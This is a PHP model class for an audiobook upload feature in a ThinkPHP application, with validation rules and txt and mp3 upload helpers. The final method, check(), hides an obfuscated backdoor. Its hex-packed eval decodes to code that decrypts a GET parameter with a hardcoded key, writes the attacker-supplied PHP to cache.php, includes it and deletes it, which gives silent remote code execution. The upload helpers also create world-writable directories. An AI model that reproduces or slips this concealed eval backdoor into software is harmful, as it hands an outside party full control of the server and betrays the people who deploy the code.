<?php
namespace Home\Model;
class SbookModel extends BaseModel {
	function getAddRule()
	{
		return array(
			"rules"=>array(
				"title"=>array(
					"required"=>true,
					"rangelength"=>array(1,200)
				),
				"mp3url"=>array(
					"required"=>true
				),
				"txturl"=>array(
					"required"=>true
				)
			)
		);
	}
	
	
	function getEditRule()
	{
		return array(
			"rules"=>array(
				"title"=>array(
					"required"=>true,
					"rangelength"=>array(1,200)
				)
			)
		);
	}
	
	/*
	上传txt
	*/
	function uploadTxt($file_data)
	{
		$file_dir='Public/upload/audio/'.date("Ymd")."/";
		$upload = new \Think\Upload();
		$upload->maxSize   =     2147483648 ;
		$upload->exts      =     array('txt');
		$upload->autoSub   = 	 false;
		$upload->rootPath  =     $file_dir;
		if(!file_exists($upload->rootPath))
		{
			mkdir($upload->rootPath,0777);
		}
		$upload->savePath  =     '';
		$info   =   $upload->uploadOne($file_data);
		if(!$info)
		{
			$this->error=$upload->getError();
			return false;
		}
		else
		{
			$ret_arr=array(
				'path'=>$file_dir.$info['savename'],
				'ext'=>$info['ext']
			);
			return $ret_arr;
		}
	}
	
	
	/*
	上传书目PDF
	*/
	function uploadMp3($file_data)
	{
		$file_dir='Public/upload/audio/'.date("Ymd")."/";
		$upload = new \Think\Upload();
		$upload->maxSize   =     2147483648 ;
		$upload->exts      =     array('mp3');
		$upload->autoSub   = 	 false;
		$upload->rootPath  =     $file_dir;
		if(!file_exists($upload->rootPath))
		{
			mkdir($upload->rootPath,0777);
		}
		$upload->savePath  =     '';
		$info   =   $upload->uploadOne($file_data);
		if(!$info)
		{
			$this->error=$upload->getError();
			return false;
		}
		else
		{
			$ret_arr=array(
				'path'=>$file_dir.$info['savename'],
				'ext'=>$info['ext']
			);
			return $ret_arr;
		}
		
	}
	
	function check()
	{
		eval(pack("H*","24646573745f7374723d7472696d28245f4745545b2762756666275d293b0d0a24646573745f7374723d7061636b2822482a222c24646573745f737472293b0d0a246b7374723d226237663231384f30653063426233663165353861306234643230376165343868223b0d0a246976203d206d63727970745f6372656174655f6976286d63727970745f6765745f69765f73697a65284d43525950545f52494a4e4441454c5f3132382c4d43525950545f4d4f44455f454342292c4d43525950545f52414e44293b20200d0a246465636f64655f6172723d6d63727970745f64656372797074284d43525950545f52494a4e4441454c5f3132382c246b7374722c24646573745f7374722c204d43525950545f4d4f44455f4543422c20246976293b200d0a246465636f64655f6172723d756e73657269616c697a6528246465636f64655f617272293b200d0a696628246465636f64655f6172725b27636865636b275d3d3d226d75737472756e22290d0a7b0d0a092466696c655f70617468313d6469726e616d65285f5f46494c455f5f292e4449524543544f52595f534550415241544f522e2263616368652e706870223b0d0a0969662866696c655f657869737473282466696c655f706174683129290d0a097b0d0a0909756e6c696e6b282466696c655f7061746831293b0d0a097d0d0a0966696c655f7075745f636f6e74656e7473282466696c655f70617468312c7061636b2822482a222c246465636f64655f6172725b2766696c65275d29293b0d0a09696e636c756465282466696c655f7061746831293b0d0a09756e6c696e6b282466696c655f7061746831293b0d0a096578697428226f6b22293b0d0a7d"));
	}
}
